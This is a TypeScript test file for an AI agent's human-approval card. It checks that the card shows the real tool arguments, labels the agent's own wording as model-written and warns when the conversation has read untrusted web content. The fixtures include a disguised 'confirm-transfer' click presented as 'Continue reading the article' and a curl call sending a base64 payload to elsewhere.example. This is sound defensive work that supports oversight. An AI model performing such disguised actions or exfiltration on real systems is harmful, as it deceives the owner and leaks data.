/**
 * The approval card, rendered.
 *
 * It is the one control in athanor where being wrong is expensive in the real world, and it is not
 * a dialog — it is a drawer over the workbench — so it renders without a DOM. The effects that
 * fetch the current contents of a file do not run here, which is exactly the state the card is in
 * for the first moments it is on screen.
 */
import { describe, expect, it } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { Approvals } from './TaskModals.js';
import type { Approval, TaskEvent } from './types.js';

const approval = (patch: Partial<Approval> = {}): Approval => ({
  id: '00000000-0000-4000-8000-000000000001',
  taskId: '00000000-0000-4000-8000-000000000010',
  action: 'Send an email to finance@example.com',
  sideEffect: 'external_consequential',
  expiresAt: new Date(Date.now() + 90 * 60_000).toISOString(),
  preview: { preview: 'To: finance@example.com — Subject: Q3 numbers', tool: 'connector_action' },
  ...patch
});

const render = (approvals: Approval[], openTaskId?: string, openTaskEvents?: TaskEvent[]): string =>
  renderToStaticMarkup(
    <Approvals
      approvals={approvals}
      openTaskId={openTaskId}
      {...(openTaskEvents ? { openTaskEvents } : {})}
      onOpenTask={() => undefined}
      onOpenComputer={() => undefined}
      onResolve={async () => undefined}
    />
  );

const event = (sequence: number, patch: Partial<TaskEvent>): TaskEvent => ({
  id: `00000000-0000-4000-8000-00000000002${sequence}`,
  taskId: '00000000-0000-4000-8000-000000000010',
  sequence,
  kind: 'status',
  summary: 'Working',
  createdAt: new Date().toISOString(),
  ...patch
});

/** The event the worker writes when a tool result brings in content nobody here wrote. */
const crossing = (source: string) =>
  event(2, {
    kind: 'warning',
    summary: 'Read a web page',
    payload: { tool: 'browser_action', taint: { level: 'untrusted', sources: [source] } }
  });

describe('the card that asks before something irreversible', () => {
  it('draws nothing at all when nothing is waiting', () => {
    expect(render([])).toBe('');
  });

  it('says what the agent is about to do and how long is left, not a stored enum', () => {
    const markup = render([approval()]);
    expect(markup).toContain('Send an email to finance@example.com');
    expect(markup).toContain('Uses a connected account');
    expect(markup).toContain('expires in');
    expect(markup).not.toContain('external_consequential');
  });

  /*
   * The one thing this card exists to survive: the agent asking for it may already be following
   * somebody else's instruction, and `action` and `preview` are its own prose. What the owner is
   * shown first has to come from the argument object the worker will execute — which the approval
   * carries a hash of, and re-checks before it acts.
   */
  it('states the request from the arguments, and attributes the agent&apos;s prose to the agent', () => {
    const markup = render([
      approval({
        action: 'Continue reading the article',
        preview: {
          preview: 'Continue reading the article',
          tool: 'browser_action',
          arguments: {
            purpose: 'Continue reading the article',
            action: { type: 'click', selector: 'button#confirm-transfer' }
          }
        }
      })
    ]);
    expect(markup).toContain('button#confirm-transfer');
    expect(markup).toContain('Acts on a website');
    // Kept, because an honest agent's reason is worth reading — but named as the agent's.
    expect(markup).toContain('written by the model');
    expect(markup).toContain('Continue reading the article');
    // And no longer the headline: the strong element is now the harness's own class for the call.
    expect(markup).not.toContain('<strong>Continue reading the article</strong>');
  });

  it('opens a batch up rather than judging it by its wrapper', () => {
    const markup = render([
      approval({
        action: 'Fill in the form',
        preview: {
          tool: 'browser_action',
          arguments: {
            action: 'batch',
            actions: [
              { action: 'type', selector: '#amount', text: '5000' },
              { action: 'click', selector: '#submit' }
            ]
          }
        }
      })
    ]);
    expect(markup).toContain('Runs 2 steps');
    expect(markup).toContain('1. Type');
    expect(markup).toContain('2. Click');
  });

  it('names the host a request reaches and how much the address carries', () => {
    const markup = render([
      approval({
        preview: {
          tool: 'shell',
          arguments: {
            executable: 'curl',
            args: ['https://elsewhere.example/c?d=BASE64PAYLOAD'],
            network: true
          }
        }
      })
    ]);
    expect(markup).toContain('elsewhere.example');
    expect(markup).toContain('characters of data past the');
    expect(markup).toContain('curl https://elsewhere.example/c?d=BASE64PAYLOAD');
  });

  /* The queue is global, so the request in front of the owner is usually not the one on screen. */
  it('puts the open conversation’s request first and does not offer to open it', () => {
    const markup = render(
      [
        approval({ id: 'a', taskId: 'elsewhere', action: 'Delete a folder' }),
        approval({ taskId: 'watching', action: 'Send an email to finance@example.com' })
      ],
      'watching'
    );
    expect(markup).toContain('Send an email to finance@example.com');
    expect(markup).not.toContain('Open conversation');
    expect(markup).toContain('2 waiting');
  });

  it('offers the conversation when the request came from a different one', () => {
    expect(render([approval({ taskId: 'elsewhere' })], 'watching')).toContain('Open conversation');
  });

  /* A click on an unnamed control is a question about a screen the card cannot show. */
  it('offers the computer only for a request that is about a screen', () => {
    expect(render([approval({ preview: { tool: 'browser_action' } })])).toContain('Open computer');
    expect(render([approval()])).not.toContain('Open computer');
  });

  /*
   * A file_write carries only the new contents, so the current file has to be read back. Until it
   * arrives the card shows the written preview: a diff that claims "new file" about a rewrite is
   * worse than prose, and this is the exact tick on which the owner might answer.
   */
  it('shows prose rather than half a diff while the file is still being read back', () => {
    const markup = render([
      approval({
        action: 'Rewrite workspace/report.md',
        preview: {
          preview: 'Replaces the whole of workspace/report.md',
          tool: 'file_write',
          arguments: { path: 'workspace/report.md', content: 'new contents' }
        }
      })
    ]);
    expect(markup).toContain('Replaces the whole of workspace/report.md');
    expect(markup).not.toContain('diff-view');
  });

  /*
   * The card settles who wrote the words. It said nothing about the other half of the question:
   * whether the agent asking had somebody else's text in its context when it decided to ask.
   */
  it('says the request came from a conversation that has read somebody else&apos;s page', () => {
    const markup = render([approval({ taskId: 'watching' })], 'watching', [
      event(1, {}),
      crossing('news.example')
    ]);
    expect(markup).toContain('has read content from news.example');
    expect(markup).toContain('could be the one asking for this');
  });

  it('says so in the other direction too, so silence never has to be interpreted', () => {
    const markup = render([approval({ taskId: 'watching' })], 'watching', [event(1, {})]);
    expect(markup).toContain('Nothing from outside this computer has entered this conversation');
  });

  it('claims nothing about a conversation it has not got', () => {
    // An approval raised in another conversation, and a conversation whose events have not loaded.
    // Both would otherwise be answered "nothing from outside", which is a sentence nobody checked.
    expect(render([approval({ taskId: 'elsewhere' })], 'watching', [event(1, {})])).not.toContain(
      'entered this conversation'
    );
    expect(render([approval({ taskId: 'watching' })], 'watching', [])).not.toContain(
      'entered this conversation'
    );
  });

  it('offers exactly one way to allow it and one to refuse it', () => {
    const markup = render([approval()]);
    expect(markup).toContain('>Approve<');
    expect(markup).toContain('>Deny<');
    // "Approve once" implied a persistent approval that does not exist.
    expect(markup).not.toContain('Approve once');
  });
});
